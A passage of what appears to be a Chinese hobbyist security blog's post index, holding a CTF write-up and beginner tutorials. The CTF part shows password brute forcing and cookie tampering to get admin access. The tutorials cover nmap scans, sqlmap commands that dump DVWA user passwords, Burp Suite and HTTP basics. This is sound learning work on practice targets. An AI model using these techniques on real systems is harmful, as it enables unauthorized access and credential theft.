查看页面源代码，发现页面代码部分没有需要的信息，但下面有很多空白 将页面拉到最底部，发现 于是将原网址 http://39.107.92.230/web/web5/index.php修改为 http://39.107.92.230/web/web5/password.txt 回车，出来一个页面，里面有很多密码项 将其保存为.txt格式的文件（字典），然后抓包，使用intruder进行破解 在intruder-payloads-payload option中选择load，载入字典 破解得到密码 发现密码有六位，但输入框只能输入五位密码 审查元素-将输入位数改为6，提交依然错误 返回burpsuit，查看此密码的response 发现newpage后面的数据为base加密的 进行解码，得到 290bca70c7dae93db6644fa00b9d83b9.php将网址改为 http://39.107.92.230/web/web5/290bca70c7dae93db6644fa00b9d83b9.php来到一个新界面 随意提交内容，提示 你还没有登录，不能留言！则进行抓包 首先要将islogin的值改为1 接着要把userlevel的值改为root（“管理员”是一个很重要的提示，一般管理员默认用户名，linux下比如admin，root。windows下是administrator，我们可以合理猜解） 然后repeater-go 在response中发现flag 再对flag进行URL转码，最终得到flag]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[IP地址及其绕过]]></title>
    <url>%2F2018%2F07%2F19%2FIP%E5%9C%B0%E5%9D%80%E5%8F%8A%E5%85%B6%E7%BB%95%E8%BF%87%2F</url>
    <content type="text"><![CDATA[绕过服务器IP地址过滤 IP地址IP地址被用来给Internet上的电脑一个编号。是每台联网的PC上都需要有IP地址，才能正常通信。我们可以把“个人电脑”比作“一台电话”，那么“IP地址”就相当于“电话号码” 查看本机IP地址以管理员身份运行cmd，输入ipconfig回车 网络中的代理代理服务器是”网络信息的中转站”。在一般情况下，我们使用网络浏览器直接去连接其他Internet站点取得网络信息时，须送出Request信号来得到回答，然后对方再把信息以bit方式传送回来。代理服务器是介于浏览器和Web服务器之间的一台服务器，有了它之后，浏览器不是直接到Web服务器去取回网页而是向代理服务器发出请求，Request信号会先送到代理服务器，由代理服务器来取回浏览器所需要的信息并传送给你的浏览器 X-Forwarded-For当你使用了代理时，web服务器就不知道你的真实IP了，为了避免这个情况，代理服务器通常会增加一个叫做X-Forwarded-For的头信息，把连接它的客户端IP（即你的上网机器IP）加到这个头信息里，这样就能保证网站的web服务器能获取到真实IP]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[nmap端口扫描]]></title>
    <url>%2F2018%2F07%2F19%2Fnmap%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%2F</url>
    <content type="text"><![CDATA[nmap 什么是端口扫描端口扫描是指某些别有用心的人发送一组端口扫描消息，试图以此侵入某台计算机，并了解其提供的计算机网络服务类型(这些网络服务均与端口号相关)，但是端口扫描不但可以为黑客所利用，同时还可通过对端口的扫描，了解网站中出现的漏洞以及端口的开放情况 进行端口扫描1.获取http://nmap.org 的主机是否开启 输入命令：nmap -F -sT -v nmap.org -F：扫描100个最有可能开放的端口-v 获取扫描的信息-sT：采用的是TCP扫描 不写也是可以的，默认采用的就是TCP扫描 运行如下： 由图中的1，我们可以发现对URL进行解析花了16.5秒，这个地方花费的时间可以进行优化 图中的2，是总共的运行时间 图中的3是说明有96个端口被屏蔽了，也就是说明了网站的防火墙是开启的，因为没有开启防火墙是不会对端口进行屏蔽的 图中的4是本次返回的关键信息，其中我们要主要关注的是端口号，端口状态，端口上的服务]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[HTML与PHP]]></title>
    <url>%2F2018%2F07%2F19%2Ffourth-day%2F</url>
    <content type="text"><![CDATA[HTML和PHP之间的关系 首先html/css/javascript 都是前端的，给浏览器执行、渲染的，你本地打开就可以看到效果 php/asp/jsp 等是后端的程序，在服务器运行的，他们生成前端的代码发送给客户端(浏览器)。前端的也叫静态代码，后端的叫动态代码，是指一个php文件，可以根据参数的不同，生成不同的前端代码。如果服务器直接放的是html文件，用户请求页面的时候就直接发给浏览器了。 早期的网站都是静态(html)的，有多少个页面就要有多少个html文件,1000条新闻要1000个html页面，而php等动态网站，只要一个php文件就够了，所以叫动态，动态网站才可以交互，比如用户留言什么的。 html收集数据提交给php处理，然后php再把数据返回给html显示！举个最简单的例子，注册网页游戏的时候，看到的注册页面就是html页面，然后你输入用户名密码这些数据后，点确认的时候就把数据提交给php页面处理，php页面将你提交的数据处理一下，如果符合要求就会将成功的信息返回给html页面了，所以说它们谁也离不开谁。]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[SQLmap注入]]></title>
    <url>%2F2018%2F07%2F19%2FSQLmap%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[自己试了一下使用sqlmap注入获取密码，还挺有意思的 SQLMAP什么是SQLMAPSQLmap是一款用来检测与利用SQL注入漏洞的免费开源工具，有一个非常棒的特性，即对检测与利用的自动化处理（数据库指纹、访问底层文件系统、执行命令）。 sqlmap只是用来检测和利用sql注入点的，并不能扫描出网站有哪些漏洞 通过DVWA测试注入获取信息流程1.将DVWA安全设置为low；复制SQL Injection页面的网址 检测注入点是否可用： sqlmap.py -u &quot;网址&quot;参数： -u：指定注入点url2.找不到注入点：回到SQL Injection页面随便输入然后submit，通过抓包获取详细的参数列表和cookie信息 将参数增添加在原网址后；在指令后面加入Cookie信息 sqlmap.py -u &quot;目标地址&quot; --cookie=&quot;信息&quot; 注入结果展示： （1）注入参数id为GET注入，注入类型有四种分别为：boolean-based blind、error-based、stacked queries、inline query。 （2）web服务器系统为windows （3）web应用程序技术为：... （4）数据库类型为：...3.使用 –dbs 即可曝出该sqlserver中所有数据库名称 sqlmap.py -u &quot;网址&quot; --cookie=&quot;information&quot; --dbs 结果显示该sqlserver中共包含5个可用的数据库。 4.获取web当前使用的数据库 sqlmap.py -u &quot;网址&quot; --cookie=&quot;information&quot; --dbs --current-db 5.枚举DVWA数据表，执行以下命令： sqlmap.py -u &quot;网址&quot; --cookie=&quot;information&quot; --dbs --current-db -D dvwa --tables使用选项： 1、-D: 要枚举的DBMS数据库 2、–tables: 枚举DBMS数据库中的数据表 #数据库管理系统(Database Management System)是一种操纵和管理数据库的大型软件， 用于建立、使用和维护数据库，简称DBMS 6.获取用户表的列 sqlmap.py -u &quot;网址&quot; --cookie=&quot;information&quot; --dbs --current-db -D dvwa --tables -T users --columns使用选项： -T : 要枚举的DBMS数据库表 –columns : 枚举DBMS数据库表中的所有列 7.将用户与密码表中的所有用户名与密码dump出来： sqlmap.py -u &quot;网址&quot; --cookie=&quot;information&quot; --dbs --current-db -D dvwa --tables -T users -C user,password --dump使用选项： -T : 要枚举的DBMS数据表 -C: 要枚举的DBMS数据表中的列 –dump : 转储DBMS数据表项SQLmap会提问是否破解密码,输入y确认]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Burpsuit的使用]]></title>
    <url>%2F2018%2F07%2F18%2Fthird-day%2F</url>
    <content type="text"><![CDATA[目录：Burpsuit的proxy功能及其使用、intruder的使用、repeater、抓包信息 Burp Suit 之 proxy(一)Proxy(代理)代理功能使我们能够截获并修改请求.为了拦截请求,并对其进行操作，我们必须通过Burp Suite配置我们的浏览器.我们可以在Proxy–&gt;options下来修改这个配置. Raw 这是视图主要显示web请求的raw格式，包含请求地址、http协议版本、主机头、浏 览器信息、Accept可接受的内容类型、字符集、编码方式、cookie等。你可以通过手工 修改这些信息，对服务器端进行渗透测试。 params 这个视图主要显示客户端请求的参数信息、包括GET或者POST请求的参数、 Cookie参数。渗透人员可以通过修改这些请求参数来完成对服务器端的渗透测试。 headers 这个视图显示的信息和Raw的信息类似，只不过在这个视图中，展示得更直观、 友好。Hex这个视图显示Raw的二进制内容，你可以通过hex编辑器对请求的内容进行修改。 Burp suit - proxy(二)Burp Proxy的拦截功能主要由Intercept选项卡中的Forward、Drop、Interception is on/off、 Action、Comment 以及Highlight构成 它们的功能分别是： Forward当查看过消息或者重新编辑过消息之后，点击此按钮，将发送消息至服务器端。Drop的功能是你想丢失当前拦截的消息，不再forward到服务器端。 Interception is on表示拦截功能打开 Interception is off表示拦截功能关闭 Action除了将当前请求的消息传递到Spider、Scanner、 Repeater、Intruder、Sequencer、Decoder、Comparer组件外，还可以做一些请求消息的修改，如改变GET或者POST请求方式、改变请求body的编码，同时也可以改变请求消息的拦截设置，如不再拦截此主机的消息、不再拦截此IP地址的消息、不再拦截此种文件类型的消 息、不再拦截此目录的消息，也可以指定针对此消息拦截它的服务器端返回消息。 Comment指对拦截的消息添加备注，在一次渗透测试中，你通常会遇到一连串的请求消息，为了便于区分，在某个关键的请求消息上，你可以添加备注信息。 Highlight与Comment功能有点类似，即对当前拦截的消息设置高亮，以便于其他的请求消息相区分。 Burp suit - intuder破解简单密码-数字密码1.登录时进行拦截，右键发送到intuder 2.点击intuder-点击position-点击clear&amp; – 清除所有默认参数 3.选中password后面的值-点击add&amp; – 自己来添加你要改变的值，这样burp就会不断的改变这个值去向网站发送该登录数据包 4.点击payloads-设置payload type为Number 5.在payload options中设置密码的起始和末尾，以及遍历的步长 6.点击intruder-attack开始 7.按Length（长度）大小排序，这时我们会看到几种不同的数据包，许多一样的，还有几个数据包很大的基本就是正确的了；点击response可查看是否能通过 Burp suit - repeater中继器；可以直接获取网页响应信息；可微调对漏洞的探测或攻击 1.右键菜单send to repeater发送到repeater，对页面数据进行修改发送。 2.点击go，发送请求，右边响应请求。 3.可以通过“&lt;“和”&gt;“来返回上一次和下一个操作。 4.单击”x“可以删除当前测试请求页面。 5.底部的功能用于搜索条件，可以用正则表达式，底部右边显示匹配结果数。 Burp suit抓包信息User-Agent什么是user agent 用户代理是指浏览器,它的信息包括硬件平台、系统软件、应用软件和用户个人偏好。用户代理的能力和偏好可以认为是元数据或用户代理的硬件和软件的特性和描述 User-Agent是Http协议中的一部分，属于头域的组成部分，User Agent也简称UA。用较为普通的一点来说，是一种向访问网站提供你所使用的浏览器类型、操作系统及版本、CPU 类型、浏览器渲染引擎、浏览器语言、浏览器插件等信息的标识。UA字符串在每次浏览器 HTTP 请求时发送到服务器 一些网站常常通过判断 UA 来给不同的操作系统、不同的浏览器发送不同的页面，因此可能造成某些页面无法在某个浏览器中正常显示，但通过伪装 UA 可以绕过检测。 为什么所有浏览器的userAgent都带Mozilla Mozilla是Netscape的吉祥物，也是Netscape Navigator浏览器使用的内部开发代号。由于Netscape早期的影响力，直到今天，所有浏览器包括IE，向Web服务器报告自己的浏览器标识的 时候，都以 “Mozilla”开头，表明自己是Mozilla兼容的。 浏览器的 UA 字串的标准格式: 浏览器标识 (操作系统标识; 加密等级标识; 浏览器语言) 渲染引擎标识 版本信息Accept-LanguageAccept-Language: en-us,en;q=0.5这个信息可以说明用户的默认语言设置。如果网站有不同的语言版本，那么就可以通过这个信息来重定向用户的浏览器。 它可以通过逗号分割来携带多国语言。第一个会是首选的语言，其它语言会携带一个“q”值，来表示用户对该语言的喜好程度（0~1）。 语言代码表 http://www.lingoes.cn/zh/translator/langcode.htmAccept-EncodingAccept-Encoding 是浏览器发给服务器,声明浏览器支持的编码类型]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[网络协议与地址]]></title>
    <url>%2F2018%2F07%2F16%2Ffirst-day%2F</url>
    <content type="text"><![CDATA[目录：什么是HTTP协议、什么是HTTPS协议、什么是URL、URL编码、JavaScript、http参数中特殊字符处理、查看网页元素 什么是HTTP协议HTTP协议是Hyper Text Transfer Protocol（超文本传输协议）的缩写,是用于从万维网（WWW:World Wide Web ）服务器传输超文本到本地浏览器的传送协议。 HTTP是一个基于TCP/IP通信协议来传递数据（HTML 文件, 图片文件, 查询结果等）。 HTTP协议工作于客户端-服务端架构为上。浏览器作为HTTP客户端通过URL向HTTP服务端即WEB服务器发送所有请求。Web服务器根据接收到的请求后，向客户端发送响应信息。 HTTP使用统一资源标识符（Uniform Resource Identifiers, URI）来传输数据和建立连接。URL是一种特殊类型的URI，包含了用于查找某个资源的足够的信息 什么是HTTPS协议HTTPS协议是为了数据传输安全的需要，在HTTP原有的基础上，加入了安全套接字层SSL协议，通过CA证书来验证服务器的身份，并对通信消息进行加密 什么是URLURL,全称是UniformResourceLocator, 中文叫统一资源定位符,是互联网上用来标识某一处资源的地址。以下面这个URL为例，介绍下普通URL的各部分组成： http://www.aspxfans.com:8080/news/index.asp?boardID=5&amp;ID=24618&amp;page=1#name从上面的URL可以看出，一个完整的URL包括以下几部分： 1.协议部分：该URL的协议部分为“http：”，这代表网页使用的是HTTP协议。在Internet中可以使用多种协议，如HTTP，FTP等等本例中使用的是HTTP协议。在”HTTP”后面的“//”为分隔符 2.域名部分：该URL的域名部分为www.aspxfans.com。一个URL中，也可以使用IP地址作为域名使用 3.端口部分：跟在域名后面的是端口，域名和端口之间使用“:”作为分隔符。端口不是一个URL必须的部分，如果省略端口部分，将采用默认端口 4.虚拟目录部分：从域名后的第一个“/”开始到最后一个“/”为止，是虚拟目录部分。虚拟目录也不是一个URL必须的部分。本例中的虚拟目录是“/news/” 5.文件名部分：从域名后的最后一个“/”开始到“？”为止，是文件名部分，如果没有“?”,则是从域名后的最后一个“/”开始到“#”为止，是文件部分，如果没有“？”和“#”，那么从域名后的最后一个“/”开始到结束，都是文件名部分。本例中的文件名是“index.asp”。文件名部分也不是一个URL必须的部分，如果省略该部分，则使用默认的文件名 6.锚部分：从“#”开始到最后，都是锚部分。本例中的锚部分是“name”。锚部分也不是一个URL必须的部分 7.参数部分：从“？”开始到“#”为止之间的部分为参数部分，又称搜索部分、查询部分。本例中的参数部分为“boardID=5&amp;ID=24618&amp;page=1”。参数可以允许有多个参数，参数与参数之间用“&amp;”作为分隔符。 URL编码为什么需要编码？URL只能使用 ASCII 字符集来通过因特网进行发送。也就是说URL只能使用英文字母、阿拉伯数字和某些标点符号，不能使用其他文字和符号 这意味着 如果URL中有汉字，就必须编码后使用。 但是麻烦的是 标准的国际组织并没有规定具体的编码方法，而是交给应用程序（浏览器）自己决定。这导致”URL编码”成为了一个混乱的领域。 怎样编码？Url编码通常也被称为百分号编码，使用%百分号加上一个字节的十六进制形式 对于ASCII字符，字母a在ASCII码中对应的值为97,16进制是0x61，那么Url编码之后得到的就是%61，字母abc，url编码后得到的就是%61%62%63 JavaScriptJavaScript 是脚本语言；是一种轻量级的编程语言。 JavaScript 是可插入 HTML 页面的编程代码。 unescape() 函数可对通过 escape() 编码的字符串进行解码。 eval() 函数可计算某个字符串，并执行其中的的 JavaScript 代码。 http参数中特殊字符处理在网址链接中，问号？表示后面要带参数 1. &apos;+&apos; URL 中+号表示空格 %2B 2. 空格 URL中的空格可以用+号或者编码 %20 3. &apos;/&apos; 分隔目录和子目录 %2F 4. &apos;?&apos; 分隔实际的 URL 和参数 %3F 5. &apos;%&apos; 指定特殊字符 %25 6. &apos;#&apos; 表示书签 %23 7. &apos;&amp;&apos; URL 中指定的参数间的分隔符 %26 8. &apos;=&apos; URL 中指定参数的值 %3D 查看网页元素审查元素可以做到定位网页元素、实时监控网页元素属性变化的功能，可以及时调试、修改、定位、追踪检查、查看嵌套 ，修改样式和查看js动态输出信息]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
</search>
